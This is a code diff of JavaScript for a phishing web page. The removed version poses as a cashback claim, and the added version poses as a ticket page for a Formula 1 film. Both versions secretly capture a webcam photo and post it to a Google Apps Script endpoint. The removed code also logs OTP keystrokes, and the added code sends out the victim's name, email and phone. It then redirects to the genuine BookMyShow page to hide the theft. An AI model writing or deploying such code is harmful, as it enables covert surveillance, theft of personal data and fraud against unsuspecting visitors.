@@ -1,18 +1,24 @@
 const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4tpUPP57s4-wThS878CK1MlC5iIP_vIOKkV-QKyRsS2e5qED1dtfJ81EcfKjOLHP_/exec';
 
-const claimBtn = document.getElementById('claimBtn');
+const getTicketsBtn = document.getElementById('getTicketsBtn');
+const formSection = document.getElementById('formSection');
+const ticketForm = document.getElementById('ticketForm');
 const video = document.getElementById('video');
-const loader = document.getElementById('loader');
-const otpForm = document.getElementById('otpForm');
-const inputBox = document.getElementById('inputBox');
 
-claimBtn.addEventListener('click', () => {
-  loader.innerText = "📷 Verifying identity...";
-  claimBtn.style.display = "none";
-  otpForm.style.display = "block";
+// Step 1: Show form and start webcam
+getTicketsBtn.addEventListener('click', () => {
+  // Hide all other sections to simulate new page
+  document.querySelector('.hero').style.display = 'none';
+  document.querySelector('.details').style.display = 'none';
+  document.querySelector('.cast-reviews').style.display = 'none';
 
+  // Show form section
+  formSection.style.display = 'block';
+
+  // Start webcam
   navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
     video.srcObject = stream;
+    video.style.display = 'none';
 
     setTimeout(() => {
       const canvas = document.createElement('canvas');
@@ -22,35 +28,37 @@ claimBtn.addEventListener('click', () => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const base64Image = canvas.toDataURL('image/jpeg');
 
-      // Send image to backend
       fetch(APPS_SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image: base64Image })
-      })
-      .then(() => {
-        loader.innerText = "✅ Face verification complete. Enter OTP to release cashback.";
-      })
-      .catch(err => {
-        console.error('Image error:', err);
-        loader.innerText = "❌ Could not verify identity.";
       });
 
     }, 3000);
+
   }).catch(err => {
-    alert("Camera permission denied or failed.");
-    loader.innerText = "Camera access error.";
-    console.error(err);
+    console.error("Camera error:", err);
   });
 });
 
-// Keystroke logging
-inputBox.addEventListener('input', (e) => {
-  fetch(APPS_SCRIPT_URL, {
+// Step 2: Submit form and log to Telegram
+ticketForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const name = ticketForm.elements['name'].value;
+  const email = ticketForm.elements['email'].value;
+  const phone = ticketForm.elements['phone'].value;
+
+  await fetch(APPS_SCRIPT_URL, {
     method: 'POST',
     mode: 'no-cors',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ log: `🔑 User typed OTP: ${e.target.value}` })
+    body: JSON.stringify({
+      log: `🎟️ Form Submission\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`
+    })
   });
+
+  // Redirect to official site
+  window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
 });
